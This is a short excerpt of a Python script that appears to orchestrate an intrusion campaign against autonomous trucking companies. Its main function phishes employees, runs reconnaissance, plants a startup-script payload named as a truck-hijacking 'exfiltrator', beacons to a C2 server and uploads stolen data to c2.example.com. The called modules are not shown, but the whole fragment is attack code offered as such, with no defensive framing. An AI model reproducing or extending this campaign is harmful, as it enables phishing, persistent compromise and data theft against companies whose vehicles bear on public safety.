...
def main():
    """
    Main function to run the autonomous_trucking_campaign campaign.
    """
    print(f"[*] Starting autonomous_trucking_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("autonomous_trucking_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target autonomous_trucking_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/autonomous_trucking_technology_and_hijacking_trucks_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-AUTONOMOUS_TRUCKING_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("autonomous_trucking_technology_and_hijacking_trucks/autonomous_trucking_technology_and_hijacking_trucks.zip", "https://c2.example.com/upload")
    run_tool("payloads/autonomous_trucking_technology_and_hijacking_trucks_exfiltrator.py")
